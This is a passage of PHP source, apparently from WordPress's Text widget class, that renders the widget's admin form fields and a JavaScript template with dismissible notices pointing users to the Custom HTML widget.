				<label for="<?php echo $this->get_field_id( 'title' ); ?>"><?php _e( 'Title:' ); ?></label>
				<input class="widefat" id="<?php echo $this->get_field_id( 'title' ); ?>" name="<?php echo $this->get_field_name( 'title' ); ?>" type="text" value="<?php echo esc_attr( $instance['title'] ); ?>" />
			</p>
			<div class="notice inline notice-info notice-alt">
				<?php if ( ! isset( $instance['visual'] ) ) : ?>
					<p><?php _e( 'This widget may contain code that may work better in the &#8220;Custom HTML&#8221; widget. How about trying that widget instead?' ); ?></p>
				<?php else : ?>
					<p><?php _e( 'This widget may have contained code that may work better in the &#8220;Custom HTML&#8221; widget. If you haven&#8217;t yet, how about trying that widget instead?' ); ?></p>
				<?php endif; ?>
			</div>
			<p>
				<label for="<?php echo $this->get_field_id( 'text' ); ?>"><?php _e( 'Content:' ); ?></label>
				<textarea class="widefat" rows="16" cols="20" id="<?php echo $this->get_field_id( 'text' ); ?>" name="<?php echo $this->get_field_name( 'text' ); ?>"><?php echo esc_textarea( $instance['text'] ); ?></textarea>
			</p>
			<p>
				<input id="<?php echo $this->get_field_id( 'filter' ); ?>" name="<?php echo $this->get_field_name( 'filter' ); ?>" type="checkbox"<?php checked( ! empty( $instance['filter'] ) ); ?> />&nbsp;<label for="<?php echo $this->get_field_id( 'filter' ); ?>"><?php _e( 'Automatically add paragraphs' ); ?></label>
			</p>
			<?php
		endif;
	}

	/**
	 * Render form template scripts.
	 *
	 * @since 4.8.0
	 * @since 4.9.0 The method is now static.
	 */
	public static function render_control_template_scripts() {
		$dismissed_pointers = explode( ',', (string) get_user_meta( get_current_user_id(), 'dismissed_wp_pointers', true ) );
		?>
		<script type="text/html" id="tmpl-widget-text-control-fields">
			<# var elementIdPrefix = 'el' + String( Math.random() ).replace( /\D/g, '' ) + '_' #>
			<p>
				<label for="{{ elementIdPrefix }}title"><?php esc_html_e( 'Title:' ); ?></label>
				<input id="{{ elementIdPrefix }}title" type="text" class="widefat title">
			</p>

			<?php if ( ! in_array( 'text_widget_custom_html', $dismissed_pointers, true ) ) : ?>
				<div hidden class="wp-pointer custom-html-widget-pointer wp-pointer-top">
					<div class="wp-pointer-content">
						<h3><?php _e( 'New Custom HTML Widget' ); ?></h3>
						<?php if ( is_customize_preview() ) : ?>
							<p><?php _e( 'Did you know there is a &#8220;Custom HTML&#8221; widget now? You can find it by pressing the &#8220;<a class="add-widget" href="#">Add a Widget</a>&#8221; button and searching for &#8220;HTML&#8221;. Check it out to add some custom code to your site!' ); ?></p>
						<?php else : ?>
							<p><?php _e( 'Did you know there is a &#8220;Custom HTML&#8221; widget now? You can find it by scanning the list of available widgets on this screen. Check it out to add some custom code to your site!' ); ?></p>
						<?php endif; ?>
						<div class="wp-pointer-buttons">
							<a class="close" href="#"><?php _e( 'Dismiss' ); ?></a>
						</div>
					</div>
					<div class="wp-pointer-arrow">
						<div class="wp-pointer-arrow-inner"></div>
					</div>
				</div>
			<?php endif; ?>

			<?php if ( ! in_array( 'text_widget_paste_html', $dismissed_pointers, true ) ) : ?>
				<div hidden class="wp-pointer paste-html-pointer wp-pointer-top">
					<div class="wp-pointer-content">
						<h3><?php _e( 'Did you just paste HTML?' ); ?></h3>
						<p><?php _e( 'Hey there, looks like you just pasted HTML into the &#8220;Visual&#8221; tab of the Text widget. You may want to paste your code into the &#8220;Text&#8221; tab instead. Alternately, try out the new &#8220;Custom HTML&#8221; widget!' ); ?></p>
						<div class="wp-pointer-buttons">
							<a class="close" href="#"><?php _e( 'Dismiss' ); ?></a>
						</div>
					</div>
					<div class="wp-pointer-arrow">
						<div class="wp-pointer-arrow-inner"></div>
					</div>
				</div>
			<?php endif; ?>

			<p>
				<label for="{{ elementIdPrefix }}text" class="screen-reader-text"><?php esc_html_e( 'Content:' ); ?></label>
				<textarea id="{{ elementIdPrefix }}text" class="widefat text wp-editor-area" style="height: 200px" rows="16" cols="20"></textarea>
			</p>
		</script>
		<?php
	}
}
